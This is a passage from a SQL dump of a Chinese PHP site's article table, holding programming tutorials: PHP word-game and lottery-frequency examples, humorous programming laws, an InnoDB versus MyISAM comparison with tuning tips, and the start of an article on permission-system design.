的谜底是 “chest” 还是 “cheat”。&lt;br /&gt;\r\n　　米德里比斯&lt;br /&gt;\r\n　　米德里比斯是一款文字游戏，玩家在游戏中得到一个简短的故事并用同一类型的不同单词替换主要类型的单词，从而创建同一个故事的更无聊的新版本。阅读以下文本：“I was walking in the park when I found a lake. I jumped in and swallowed too much water. I had to go to the hospital.” 开始用其他单词标记替换单词类型。开始和结束标记带有下划线用于阻止意外的字符串匹配。&lt;br /&gt;\r\n　　清单 20. 用单词标记替换单词类型&lt;br /&gt;\r\n　　$text = &quot;I was _VERB_ing in the _PLACE_ when I found a _NOUN_.&lt;br /&gt;\r\n　　I _VERB_ed in, and _VERB_ed too much _NOUN_.&amp;nbsp;&amp;nbsp;I had to go to the _PLACE_.&quot;;&lt;br /&gt;\r\n　　接下来，创建几个基本单词列表。对于本例，我们也不会做得太复杂。&lt;br /&gt;\r\n　　清单 21. 创建几个基本单词列表&lt;br /&gt;\r\n　　$verbs = array(''pump'', ''jump'', ''walk'', ''swallow'', ''crawl'', ''wail'', ''roll'');&lt;br /&gt;\r\n　　$places = array(''park'', ''hospital'', ''arctic'', ''ocean'', ''grocery'', ''basement'',&lt;br /&gt;\r\n　　''attic'', ''sewer'');&lt;br /&gt;\r\n　　$nouns = array(''water'', ''lake'', ''spit'', ''foot'', ''worm'',&lt;br /&gt;\r\n　　''dirt'', ''river'', ''wankel rotary engine'');&lt;br /&gt;\r\n　　现在可以重复地评估文本来根据需要替换标记。&lt;br /&gt;\r\n　　清单 22. 评估文本&lt;br /&gt;\r\n　　while (preg_match(&quot;/(_VERB_)|(_PLACE_)|(_NOUN_)/&quot;, $text, $matches)) {&lt;br /&gt;\r\n　　switch ($matches[0]) {&lt;br /&gt;\r\n　　case ''_VERB_'' :&lt;br /&gt;\r\n　　shuffle($verbs);&lt;br /&gt;\r\n　　$text = preg_replace($matches[0], current($verbs), $text, 1);&lt;br /&gt;\r\n　　break;&lt;br /&gt;\r\n　　case ''_PLACE_'' :&lt;br /&gt;\r\n　　shuffle($places);&lt;br /&gt;\r\n　　$text = preg_replace($matches[0], current($places), $text, 1);&lt;br /&gt;\r\n　　break;&lt;br /&gt;\r\n　　case ''_NOUN_'' :&lt;br /&gt;\r\n　　shuffle($nouns);&lt;br /&gt;\r\n　　$text = preg_replace($matches[0], current($nouns), $text, 1);&lt;br /&gt;\r\n　　break;&lt;br /&gt;\r\n　　}&lt;br /&gt;\r\n　　}&lt;br /&gt;\r\n　　echo $text;&lt;br /&gt;\r\n　　很明显，这是一个简单而粗糙的示例。单词列表越精确，并且花在基本文本上的时间越多，结果就越好。我们已经使用了文本文件创建名称列表及基本单词列表。使用相同原则，我们可以创建按类型划分的单词列表并使用这些单词列表创建更加变化多端的米德里比斯游戏。&lt;br /&gt;\r\n　　乐透机&lt;br /&gt;\r\n　　全部选中乐透的六个正确号码 —— 退一步说 —— 在统计学上是不可能的。不过，许多人仍然花钱去玩，而且如果您喜欢号码，则查看趋势图可能很有趣。让我们构建一个脚本，该脚本将允许跟踪赢奖号码并在列表中提供选择次数最少的 6 个号码。&lt;br /&gt;\r\n　　（免责声明：这不会帮助您中乐透奖，因此请不要花钱购买奖券。这只是为了娱乐）。&lt;br /&gt;\r\n　　把赢奖的乐透选择保存到文本文件中。用逗号分隔各个号码并把每组号码放在单独一行中。使用换行符分隔文件内容并使用逗号分隔行后，可以得到类似清单 23 的内容。&lt;br /&gt;\r\n　　清单 23. 把选择的赢奖乐透保存到文本文件中&lt;br /&gt;\r\n　　$picks = array(&lt;br /&gt;\r\n　　array(''6'', ''10'', ''18'', ''21'', ''34'', ''40''),&lt;br /&gt;\r\n　　array(''2'', ''8'', ''13'', ''22'', ''30'', ''39''),&lt;br /&gt;\r\n　　array(''3'', ''9'', ''14'', ''25'', ''31'', ''35''),&lt;br /&gt;\r\n　　array(''11'', ''12'', ''16'', ''24'', ''36'', ''37''),&lt;br /&gt;\r\n　　array(''4'', ''7'', ''17'', ''26'', ''32'', ''33'')&lt;br /&gt;\r\n　　);&lt;br /&gt;\r\n　　很明显，这不足以成为绘制统计&lt;span class=&quot;t_tag&quot; onclick=&quot;tagshow(event)&quot; href=&quot;http://www.canphp.com/admin/index.php/article/tag.php?name=%E6%95%B0%E6%8D%AE&quot;&gt;数据&lt;/span&gt;的基本文件。但是它是一个开端，并且足以演示基本原理。&lt;br /&gt;\r\n　　设置一个基本数组以保存选择范围。例如，如果选择 1 到 40 之间（例如，$numbers = array_fill(1,40,0);）的号码，则遍历我们的选择，递增相应的匹配值。&lt;br /&gt;\r\n　　清单 24. 遍历选择&lt;br /&gt;\r\n　　foreach ($picks as $pick) {&lt;br /&gt;\r\n　　foreach ($pick as $number) {&lt;br /&gt;\r\n　　$numbers[$number]++;&lt;br /&gt;\r\n　　}&lt;br /&gt;\r\n　　}&lt;br /&gt;\r\n　　最后，根据值将号码排序。此操作应当会把最少选择的号码放在数组的前部。&lt;br /&gt;\r\n　　清单 25. 根据值将号码排序&lt;br /&gt;\r\n　　asort($numbers);&lt;br /&gt;\r\n　　$pick = array_slice($numbers,0,6,true);&lt;br /&gt;\r\n　　echo implode('','', array_keys($pick));&lt;br /&gt;\r\n　　通过有规律地向包含中奖号码列表的文本文件添加实际的乐透中奖号码，可以发现选号的长期趋势。查看某些号码的出现频率十分有趣。', 1, 1, 0, 0, 1301802481, 1, 'admin');
INSERT INTO `cp_article` (`id`, `cat_id`, `title`, `keywords`, `description`, `content`, `views`, `status`, `top`, `recommend`, `create_time`, `create_uid`, `create_username`) VALUES
(22, 1, '程序开发规律', '', '', '&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; 1 任何一个程序一旦发布就意味着它已经过时了。&lt;br /&gt;\r\n　　2 让需求根据程序调整往往要比让程序根据需求调整来得容易。&lt;br /&gt;\r\n　　3 如果一个程序是有用的，那它必将被改变。&lt;br /&gt;\r\n　　4 如果一个程序是无用的，那它必须被注释。&lt;br /&gt;\r\n　　5 在任何一个程序里只有10%的代码会被执行。&lt;br /&gt;\r\n　　6 软件会无限扩张以占用所有的系统资源。&lt;br /&gt;\r\n　　7 任何有价值的程序都会包含至少一个错误。 &lt;br /&gt;\r\n　　8 一个演示版的程序完美无瑕的几率和关注它的人数成反比，最终要花费的金钱的数量是原数量的平方。 &lt;br /&gt;\r\n　　9 一个程序的致命错误要到其发布至少半年后才会被发现。&lt;br /&gt;\r\n　　10 不可检测的错误是无穷无尽的，并以各种形式存在;相反，可检测的错误从理论上讲是有限的。&lt;br /&gt;\r\n　　11 随着时间的推移，修正某个错误所需花费的精力会成指数级增加。 &lt;br /&gt;\r\n　　12 程序的复杂度会一直增长，直到超出维护它的程序员的能力为止。&lt;br /&gt;\r\n　　13 一段你自己写的代码如果几个月不曾看过，那很有可能其他人也会写出相同的代码。&lt;br /&gt;\r\n　　14 在每个小程序里都会有一大段代码想要破壳而出。&lt;br /&gt;\r\n　　15 你越快开始编写代码，就会需要越长的时间。&lt;br /&gt;\r\n　　16 一个项目如果没有精心策划，那将需要比预期多出两倍的时间来完成它;相反的，如果项目是精心策划过的，就只需要多出一倍的时间。&lt;br /&gt;\r\n　　17 向一个落后于进度的项目添加程序员只会让项目更加落后于进度。&lt;br /&gt;\r\n　　18 一个程序的完成程度总在90%到95%之间。&lt;br /&gt;\r\n　　19 如果你让一团糟糕的代码自动化，那你就会得到一团自动化的糟糕的代码。&lt;br /&gt;\r\n　　20 建立一个连傻瓜都会使用的程序，而只有一个傻瓜才想要去使用它。&lt;br /&gt;\r\n　　21 用户直到他们使用了一个程序之后才知道他们究竟想要的是什么。', 1, 1, 0, 0, 1302056155, 1, 'admin'),
(23, 1, 'mysql的InnoDB和MyISAM区别总结', '', '', '&lt;pre&gt;&lt;span&gt;InnoDB&lt;/span&gt;和&lt;span&gt;MyISAM&lt;/span&gt;是在使用&lt;span&gt;MySQL&lt;/span&gt;最常用的两个表类型，各有优缺点，视具体应用而定。&lt;br /&gt;\r\n下面是已知的两者之间的差别，仅供参考。&lt;/pre&gt;&lt;pre&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;/pre&gt;&lt;pre&gt;&lt;span&gt;innodb&lt;/span&gt;&lt;/pre&gt;&lt;pre&gt;&lt;span&gt;InnoDB &lt;/span&gt;给&lt;span&gt; MySQL &lt;/span&gt;提供了具有事务&lt;span&gt;(commit)&lt;/span&gt;、回滚&lt;span&gt;(rollback)&lt;/span&gt;和崩溃修复能力&lt;span&gt;&lt;br /&gt;\r\n(crash recovery capabilities)&lt;/span&gt;的事务安全&lt;/pre&gt;&lt;pre&gt;&lt;span&gt;(transaction-safe (ACID compliant))&lt;/span&gt;型表。&lt;span&gt;InnoDB &lt;/span&gt;提供了&lt;span style=&quot;color:red;&quot;&gt;行锁&lt;/span&gt;&lt;span&gt;&lt;br /&gt;\r\n(locking on row level)&lt;/span&gt;，提供与&lt;span&gt; Oracle &lt;/span&gt;类型一致的&lt;span style=&quot;color:red;&quot;&gt;不加锁读取&lt;/span&gt;&lt;span&gt;(non-locking &lt;br /&gt;\r\nread in SELECTs)&lt;/span&gt;。这些特性均提高了多用户并发操作的性能表现。&lt;/pre&gt;&lt;pre&gt;在&lt;span&gt;InnoDB&lt;/span&gt;表中不需要扩大锁定&lt;span&gt;(lock escalation)&lt;/span&gt;，因为&lt;span&gt; InnoDB &lt;/span&gt;的&lt;span style=&quot;color:#3366ff;&quot;&gt;列&lt;/span&gt;&lt;span style=&quot;color:red;&quot;&gt;锁定&lt;/span&gt;&lt;span&gt;(row level &lt;br /&gt;\r\nlocks)&lt;/span&gt;适宜非常小的空间。&lt;span&gt;InnoDB &lt;/span&gt;是&lt;span&gt; MySQL &lt;/span&gt;上第一个提供&lt;span style=&quot;color:red;&quot;&gt;外键约束&lt;/span&gt;&lt;span&gt;(FOREIGN KEY &lt;br /&gt;\r\nconstraints)&lt;/span&gt;的表引擎。&lt;/pre&gt;&lt;pre&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;/pre&gt;&lt;pre&gt;&lt;span&gt;InnoDB &lt;/span&gt;的设计目标是处理&lt;span style=&quot;color:red;&quot;&gt;大容量数据库系统&lt;/span&gt;，它的&lt;span&gt; CPU &lt;/span&gt;利用率是其它基于磁盘的关系数据库&lt;br /&gt;\r\n引擎所不能比的。在技术上，&lt;span&gt;InnoDB &lt;/span&gt;是一套放在&lt;span&gt; MySQL &lt;/span&gt;后台的完整数据库系统，&lt;/pre&gt;&lt;pre&gt;&lt;span&gt;InnoDB &lt;/span&gt;在主内存中建立其&lt;span style=&quot;color:red;&quot;&gt;专用的缓冲池&lt;/span&gt;用于高速缓冲数据和索引。&lt;span&gt; InnoDB &lt;/span&gt;把数据和索引存&lt;br /&gt;\r\n放在表空间里，可能包含多个文件，这与其它的不一样，举例来说，在&lt;span&gt; MyISAM &lt;/span&gt;中，表被存放&lt;br /&gt;\r\n在单独的文件中。&lt;span&gt;InnoDB &lt;/span&gt;表的大小只受限于操作系统的文件大小，一般为&lt;span&gt; 2 GB&lt;/span&gt;。&lt;/pre&gt;&lt;pre&gt;&lt;span&gt;InnoDB&lt;/span&gt;所有的表都保存在同一个数据文件&lt;span&gt; ibdata1 &lt;/span&gt;中（也可能是多个文件，或者是独立的&lt;br /&gt;\r\n表空间文件）&lt;span&gt;,&lt;/span&gt;相对来说比较不好备份，免费的方案可以是拷贝数据文件、备份&lt;span&gt; binlog&lt;/span&gt;，&lt;br /&gt;\r\n或者用&lt;span&gt; mysqldump&lt;/span&gt;。&lt;/pre&gt;&lt;pre&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;/pre&gt;&lt;pre&gt;&lt;span&gt;MyISAM &lt;/span&gt;&lt;/pre&gt;&lt;pre&gt;&lt;span&gt;MyISAM &lt;/span&gt;是&lt;span&gt;MySQL&lt;/span&gt;缺省存贮引擎&lt;span&gt; .&lt;/span&gt;&lt;/pre&gt;&lt;pre&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;/pre&gt;&lt;pre&gt;每张&lt;span&gt;MyISAM &lt;/span&gt;表被存放在三个文件 。&lt;span&gt;frm &lt;/span&gt;文件存放表格定义。 数据文件是&lt;span&gt;MYD (MYData) &lt;/span&gt;。&lt;br /&gt;\r\n&amp;nbsp;索引文件是&lt;span&gt;MYI (MYIndex) &lt;/span&gt;引伸。&lt;/pre&gt;&lt;pre&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;/pre&gt;&lt;pre&gt;&lt;span style=&quot;color:red;&quot;&gt;因为&lt;span&gt;MyISAM&lt;/span&gt;相对简单所以在效率上要优于&lt;span&gt;InnoDB..&lt;/span&gt;小型应用使用&lt;span&gt;MyISAM&lt;/span&gt;是不错的选择&lt;span&gt;.&lt;/span&gt;&lt;/span&gt;&lt;/pre&gt;&lt;pre&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;/pre&gt;&lt;pre&gt;&lt;span&gt;MyISAM&lt;/span&gt;表是保存成文件的形式&lt;span&gt;,&lt;/span&gt;在跨平台的数据转移中使用&lt;span&gt;MyISAM&lt;/span&gt;存储会省去不少的麻烦&lt;/pre&gt;&lt;pre&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;/pre&gt;&lt;pre&gt;&lt;span&gt;MyISAM&lt;/span&gt;是&lt;span&gt;ISAM&lt;/span&gt;表的新版本，有如下扩展：&lt;/pre&gt;&lt;pre&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;/pre&gt;&lt;pre&gt;&lt;span&gt;·&lt;/span&gt;二进制层次的可移植性。&lt;/pre&gt;&lt;pre&gt;&lt;span&gt;·NULL&lt;/span&gt;列索引。&lt;/pre&gt;&lt;pre&gt;&lt;span&gt;·&lt;/span&gt;对变长行比&lt;span&gt;ISAM&lt;/span&gt;表有更少的碎片。&lt;/pre&gt;&lt;pre&gt;&lt;span&gt;·&lt;/span&gt;支持大文件。&lt;/pre&gt;&lt;pre&gt;&lt;span&gt;·&lt;/span&gt;更好的索引压缩。&lt;/pre&gt;&lt;pre&gt;&lt;span&gt;·&lt;/span&gt;更好的键吗统计分布。&lt;/pre&gt;&lt;pre&gt;&lt;span&gt;·&lt;/span&gt;更好和更快的&lt;span&gt;auto_increment&lt;/span&gt;处理。&lt;/pre&gt;&lt;pre&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;/pre&gt;&lt;pre&gt;以下是一些细节和具体实现的差别：&lt;/pre&gt;&lt;pre&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;/pre&gt;&lt;pre&gt;&lt;span&gt;◆1.InnoDB&lt;/span&gt;&lt;span style=&quot;color:red;&quot;&gt;不支持&lt;span&gt;FULLTEXT&lt;/span&gt;类型的索引&lt;/span&gt;。&lt;/pre&gt;&lt;pre&gt;&lt;span&gt;◆2.InnoDB &lt;/span&gt;中不保存表的具体行数，也就是说，执行&lt;span&gt;select count(*) from table&lt;/span&gt;时，&lt;br /&gt;\r\n&lt;span&gt;InnoDB&lt;/span&gt;要扫描一遍整个表来计算有多少行，但是&lt;span&gt;MyISAM&lt;/span&gt;只要简单的读出保存好的行数即可。&lt;/pre&gt;&lt;pre&gt;注意的是，当&lt;span&gt;count(*)&lt;/span&gt;语句包含&lt;span&gt; where&lt;/span&gt;条件时，两种表的操作是一样的。&lt;/pre&gt;&lt;pre&gt;&lt;span&gt;◆3.&lt;/span&gt;对于&lt;span&gt;AUTO_INCREMENT&lt;/span&gt;类型的字段，&lt;span&gt;InnoDB&lt;/span&gt;中必须包含只有该字段的索引，但是在&lt;span&gt;MyISAM&lt;/span&gt;&lt;br /&gt;\r\n表中，可以和其他字段一起建立联合索引。&lt;/pre&gt;&lt;pre&gt;&lt;span&gt;◆4.DELETE FROM table&lt;/span&gt;时，&lt;span&gt;InnoDB&lt;/span&gt;不会重新建立表，而是一行一行的删除。&lt;/pre&gt;&lt;pre&gt;&lt;span&gt;◆5.LOAD TABLE FROM MASTER&lt;/span&gt;操作对&lt;span&gt;InnoDB&lt;/span&gt;是不起作用的，解决方法是首先把&lt;span&gt;InnoDB&lt;/span&gt;表改成&lt;br /&gt;\r\n&lt;span&gt;MyISAM&lt;/span&gt;表，导入数据后再改成&lt;span&gt;InnoDB&lt;/span&gt;表，但是对于使用的额外的&lt;span&gt;InnoDB&lt;/span&gt;特性（例如外键）的&lt;br /&gt;\r\n表不适用。&lt;/pre&gt;&lt;pre&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;/pre&gt;&lt;pre&gt;&lt;span&gt;◆MyISAM&lt;/span&gt;类型的二进制数据文件可以在不同操作系统中迁移。&lt;/pre&gt;&lt;pre&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;/pre&gt;&lt;pre&gt;另外，&lt;span&gt;InnoDB&lt;/span&gt;表的行锁也不是绝对的，假如在执行一个&lt;span&gt;SQL&lt;/span&gt;语句时&lt;span&gt;MySQL&lt;/span&gt;不能确定要扫描的&lt;br /&gt;\r\n范围，&lt;span&gt;InnoDB&lt;/span&gt;表同样会锁全表，例如&lt;span&gt;update table set num=1 where name like “%aaa%”&lt;br /&gt;\r\n&lt;br /&gt;\r\n&lt;/span&gt;&lt;/pre&gt;&lt;pre&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;/pre&gt;&lt;pre&gt;再另外，使用两种的选择：如果你的数据执行大量的&lt;span&gt;INSERT&lt;/span&gt;或&lt;span&gt;UPDATE&lt;/span&gt;，出于性能方面的考虑，&lt;br /&gt;\r\n应该使用&lt;span&gt;InnoDB&lt;/span&gt;表。如果执行大量的&lt;span&gt;SELECT&lt;/span&gt;，&lt;span&gt;MyISAM&lt;/span&gt;是更好的选择。若需要使用事务处理，&lt;br /&gt;\r\n但是原来的数据表使用的是&lt;span&gt;myisam&lt;/span&gt;，就需要改为&lt;span&gt;bdb&lt;/span&gt;或者&lt;span&gt;innodb&lt;/span&gt;，这样基于&lt;span&gt;myisam&lt;/span&gt;的程序，&lt;br /&gt;\r\n将类型改为&lt;span&gt;innodb&lt;/span&gt;后，其程序不用改动&lt;span&gt;……&lt;/span&gt;&lt;/pre&gt;&lt;pre&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;/pre&gt;&lt;pre&gt;综上所述，任何一种表都不是万能的，只有恰当的针对业务类型来选择合适的表类型，才能&lt;br /&gt;\r\n最大的发挥&lt;span&gt;MySQL&lt;/span&gt;的性能优势。&lt;/pre&gt;&lt;pre&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;/pre&gt;&lt;pre&gt;&lt;span&gt;MyISAM&lt;/span&gt;和&lt;span&gt;InnoDB&lt;/span&gt;优化：&lt;/pre&gt;&lt;pre&gt;&lt;span&gt;key_buffer_size - &lt;/span&gt;这对&lt;span&gt;MyISAM&lt;/span&gt;表来说非常重要。如果只是使用&lt;span&gt;MyISAM&lt;/span&gt;表，可以把它设置&lt;br /&gt;\r\n为可用内存的&lt;span&gt; 30-40%&lt;/span&gt;。合理的值取决于索引大小、数据量以及负载&lt;span&gt; -- &lt;/span&gt;记住，&lt;span&gt;MyISAM&lt;/span&gt;表会&lt;br /&gt;\r\n使用操作系统的缓存来缓存数据，因此需要留出部分内存给它们，很多情况下数据比索引大&lt;br /&gt;\r\n多了。尽管如此，需要总是检查是否所有的&lt;span&gt; key_buffer &lt;/span&gt;都被利用了&lt;span&gt; -- .MYI &lt;/span&gt;文件只有&lt;span&gt; 1GB&lt;/span&gt;&lt;br /&gt;\r\n，而&lt;span&gt; key_buffer &lt;/span&gt;却设置为&lt;span&gt; 4GB &lt;/span&gt;的情况是非常少的。这么做太浪费了。如果你很少使用&lt;span&gt;&lt;br /&gt;\r\nMyISAM&lt;/span&gt;表，那么也保留低于&lt;span&gt; 16-32MB &lt;/span&gt;的&lt;span&gt; key_buffer_size &lt;/span&gt;以适应给予磁盘的临时表索引&lt;br /&gt;\r\n所需。&lt;/pre&gt;&lt;pre&gt;&lt;span style=&quot;color:red;&quot;&gt;innodb_buffer_pool_size &lt;/span&gt;&lt;span&gt;- &lt;/span&gt;这对&lt;span&gt;Innodb&lt;/span&gt;表来说非常重要。&lt;span&gt;Innodb&lt;/span&gt;相比&lt;span&gt;MyISAM&lt;/span&gt;表对缓冲更&lt;br /&gt;\r\n为敏感。&lt;span&gt;MyISAM&lt;/span&gt;可以在默认的&lt;span&gt; key_buffer_size &lt;/span&gt;设置下运行的可以，然而&lt;span&gt;Innodb&lt;/span&gt;在默认的&lt;span&gt;&lt;br /&gt;\r\n&amp;nbsp;innodb_buffer_pool_size &lt;/span&gt;设置下却跟蜗牛似的。由于&lt;span&gt;Innodb&lt;/span&gt;把数据和索引都缓存起来，&lt;br /&gt;\r\n无需留给操作系统太多的内存，因此如果只需要用&lt;span&gt;Innodb&lt;/span&gt;的话则可以设置它高达&lt;span&gt; 70-80% &lt;/span&gt;的&lt;br /&gt;\r\n可用内存。一些应用于&lt;span&gt; key_buffer &lt;/span&gt;的规则有&lt;span&gt; -- &lt;/span&gt;如果你的数据量不大，并且不会暴增，那&lt;br /&gt;\r\n么无需把&lt;/pre&gt;&lt;pre&gt;&lt;span&gt;innodb_additional_pool_size - &lt;/span&gt;这个选项对性能影响并不太多，至少在有差不多足够内存&lt;br /&gt;\r\n可分配的操作系统上是这样。不过如果你仍然想设置为&lt;span&gt; 20MB(&lt;/span&gt;或者更大&lt;span&gt;)&lt;/span&gt;，因此就需要看一下&lt;br /&gt;\r\n&lt;br /&gt;\r\n&lt;span&gt;Innodb&lt;/span&gt;其他需要分配的内存有多少。&lt;/pre&gt;&lt;pre&gt;&lt;span&gt;innodb_log_file_size &lt;/span&gt;在高写入负载尤其是大数据集的情况下很重要。这个值越大则性能相&lt;br /&gt;\r\n&lt;br /&gt;\r\n对越高，但是要注意到可能会增加恢复时间。我经常设置为&lt;span&gt; 64-512MB&lt;/span&gt;，跟据服务器大小而异。&lt;/pre&gt;&lt;pre&gt;&lt;span&gt;innodb_log_buffer_size &lt;/span&gt;默认的设置在中等强度写入负载以及较短事务的情况下，服务器性&lt;br /&gt;\r\n能还可以。如果存在更新操作峰值或者负载较大，就应该考虑加大它的值了。如果它的值设置&lt;br /&gt;\r\n太高了，可能会浪费内存&lt;span&gt; -- &lt;/span&gt;它每秒都会刷新一次，因此无需设置超过&lt;span&gt;1&lt;/span&gt;秒所需的内存空间。&lt;br /&gt;\r\n通常&lt;span&gt; 8-16MB &lt;/span&gt;就足够了。越小的系统它的值越小。&lt;/pre&gt;&lt;pre&gt;&lt;span&gt;innodb_flush_logs_at_trx_commit &lt;/span&gt;是否为&lt;span&gt;Innodb&lt;/span&gt;比&lt;span&gt;MyISAM&lt;/span&gt;慢&lt;span&gt;1000&lt;/span&gt;倍而头大？看来也许你忘&lt;br /&gt;\r\n了修改这个参数了。默认值是&lt;span&gt; 1&lt;/span&gt;，这意味着每次提交的更新事务（或者每个事务之外的语句）&lt;br /&gt;\r\n&lt;span style=&quot;color:red;&quot;&gt;都会刷新到磁盘中，而这相当耗费资源&lt;/span&gt;，尤其是没有电池备用缓存时。很多应用程序，尤其是&lt;br /&gt;\r\n从&lt;span&gt; MyISAM&lt;/span&gt;转变过来的那些，把它的值设置为&lt;span&gt; 2 &lt;/span&gt;就可以了，也就是不把日志刷新到磁盘上，&lt;br /&gt;\r\n而只刷新到操作系统的缓存上。日志仍然会每秒刷新到磁盘中去，因此通常不会丢失每秒&lt;span&gt;1-&lt;br /&gt;\r\n2&lt;/span&gt;次更新的消耗。如果设置为&lt;span&gt; 0 &lt;/span&gt;就快很多了，不过也相对不安全了&lt;span&gt; -- MySQL&lt;/span&gt;服务器崩溃时&lt;br /&gt;\r\n就会丢失一些事务。设置为&lt;span&gt; 2 &lt;/span&gt;指挥丢失刷新到操作系统缓存的那部分事务。&lt;/pre&gt;&lt;pre&gt;&lt;span&gt;table_cache -- &lt;/span&gt;打开一个表的开销可能很大。例如&lt;span&gt;MyISAM&lt;/span&gt;把&lt;span&gt;MYI&lt;/span&gt;文件头标志该表正在使用&lt;br /&gt;\r\n中。你肯定不希望这种操作太频繁，所以通常要加大缓存数量，使得足以最大限度地缓存打&lt;br /&gt;\r\n开的表。它需要用到操作系统的资源以及内存，对当前的硬件配置来说当然不是什么问题了。&lt;br /&gt;\r\n如果你有&lt;span&gt;200&lt;/span&gt;多个表的话，那么设置为&lt;span&gt; 1024 &lt;/span&gt;也许比较合适（每个线程都需要打开表），&lt;br /&gt;\r\n如果连接数比较大那么就加大它的值。我曾经见过设置为&lt;span&gt; 100,000 &lt;/span&gt;的情况。&lt;/pre&gt;&lt;pre&gt;&lt;span&gt;thread_cache -- &lt;/span&gt;线程的创建和销毁的开销可能很大，因为每个线程的连接&lt;span&gt;/&lt;/span&gt;断开都需要。&lt;br /&gt;\r\n我通常至少设置为&lt;span&gt; 16&lt;/span&gt;。如果应用程序中有大量的跳跃并发连接并且&lt;span&gt; Threads_Created &lt;/span&gt;的值&lt;br /&gt;\r\n也比较大，那么我就会加大它的值。它的目的是在通常的操作中无需创建新线程。&lt;/pre&gt;&lt;pre&gt;&lt;span&gt;query_cache -- &lt;/span&gt;如果你的应用程序有大量读，而且没有应用程序级别的缓存，那么这很有&lt;br /&gt;\r\n用。不要把它设置太大了，因为想要维护它也需要不少开销，这会导致&lt;span&gt;MySQL&lt;/span&gt;变慢。通常设置&lt;br /&gt;\r\n为&lt;span&gt; 32-512Mb&lt;/span&gt;。设置完之后最好是跟踪一段时间，查看是否运行良好。在一定的负载压力下，&lt;br /&gt;\r\n如果缓存命中率太低了，就启用它。&lt;/pre&gt;&lt;pre&gt;&lt;span&gt;sort_buffer_size --&lt;/span&gt;如果你只有一些简单的查询，那么就无需增加它的值了，尽管你有&lt;span&gt; &lt;br /&gt;\r\n64GB &lt;/span&gt;的内存。搞不好也许会降低性能&lt;/pre&gt;', 1, 1, 0, 0, 1302064774, 1, 'admin'),
(24, 1, 'qq空间-拖动控件的原理', '', '', '&lt;pre id=&quot;best-answer-content&quot; class=&quot;reply-text mb10&quot;&gt;       var d=document.getElementById(&quot;type1&quot;);&lt;br /&gt;\r\n       var a=d.getElementsByTagName(&quot;li&quot;);&lt;br /&gt;\r\n 　   只需要这两句话，你想得到qq空间的效果很简单，说白了也就是控制数组。&lt;br /&gt;\r\n&lt;/pre&gt;', 1, 1, 0, 0, 1302081746, 1, 'admin'),
(25, 1, '三种权限设计方案的分析', '', '', '&lt;p&gt;权限设计是很多系统中的子部分，主要在功能和流程上起控制作用，本文列举了几种常见的权限设计方案，写出来和大家讨论一下。其中权限系统的名都是自己起的,不恰当处还请大家提出.&lt;/p&gt;\r\n&lt;p&gt;&lt;strong&gt;1.等级权限系统&lt;br /&gt;\r\n&lt;/strong&gt;这种权限系统在论坛中很常见，在这种系统中，权限如同官阶从低到高排列，每个用户对应一个权限，在权限中设定了这个用户的权限等级，在用户需要执行操作前先查看其权限等级是否大于执行操作所需要的权限等级，是则进行操作。&lt;/p&gt;\r\n&lt;p&gt;在等级权限系统中领域对象用户类User的基本属性如下：&lt;br /&gt;\r\n&lt;em&gt;&lt;strong&gt;id&amp;nbsp;// 用户ID&lt;br /&gt;\r\nname&amp;nbsp;// 用户名&lt;/strong&gt;&lt;/em&gt;&lt;/p&gt;\r\n&lt;p&gt;领域对象权限类Priviledge的基本属性如下:&lt;br /&gt;\r\n&lt;em&gt;&lt;strong&gt;id&amp;nbsp;// 权限ID&lt;br /&gt;\r\nuserid&amp;nbsp;// 持有此权限的用户id&lt;br /&gt;\r\nlevel&amp;nbsp;// 用户的权限等级&lt;/strong&gt;&lt;/em&gt;&lt;/p&gt;\r\n&lt;p&gt;level的设置示例&lt;br /&gt;\r\nlevel&amp;nbsp;对应可执行的功能&lt;br /&gt;\r\n0&amp;nbsp;访问&lt;br /&gt;\r\n1&amp;nbsp;可跟帖&lt;br /&gt;\r\n2&amp;nbsp;可创建主贴&lt;br /&gt;\r\n3&amp;nbsp;可删除主贴&lt;br /&gt;\r\n4&amp;nbsp;可创建频道&lt;br /&gt;\r\n5&amp;nbsp;可删除频道&lt;br /&gt;\r\n6&amp;nbsp;可查看用户&lt;br /&gt;\r\n7&amp;nbsp;可分配用户权限&lt;br /&gt;\r\n8&amp;nbsp;可修改用户密码&lt;br /&gt;\r\n9&amp;nbsp;可删除用户&lt;br /&gt;\r\n...&lt;/p&gt;\r\n&lt;p&gt;使用中,执行一个操作比如创建主贴时,先从Session中取出用户,然后按其id查出其对应的权限等级,拿它和执行创建主贴所需要的等级(3)进行比较,高于则可进行创建主贴操作,否则报告权限不够.&lt;/p&gt;\r\n&lt;p&gt;等级权限系统简单易用,在如论坛等刚性控制系统中使用很好,但不适用于需要有范围权限控制的场合,这时我们需要范围限制权限系统.&lt;/p&gt;\r\n&lt;p&gt;&lt;strong&gt;2.范围限制权限系统&lt;/strong&gt;&lt;br /&gt;\r\n等级权限系统系统的缺点是控制范围过广,比如一个论坛中有很多子论坛,一个子论坛的分版主同时也能对另一个同等级分论坛的帖子进行控制,这明显是不合理的,对此我们需要将版主权限控制在一版之内,这时我们需要范围限制权限系统.这种权限系统在项目管理系统中很常见.&lt;/p&gt;\r\n&lt;p&gt;在等级权限系统中领域对象用户类User的基本属性如下：&lt;br /&gt;\r\n&lt;em&gt;&lt;strong&gt;id&amp;nbsp;// 用户ID&lt;br /&gt;\r\nname&amp;nbsp;// 用户名&lt;/strong&gt;&lt;/em&gt;&lt;/p&gt;\r\n&lt;p&gt;领域对象项目类Project的基本属性如下：&lt;br /&gt;\r\n&lt;em&gt;&lt;strong&gt;id&amp;nbsp;// 项目ID&lt;br 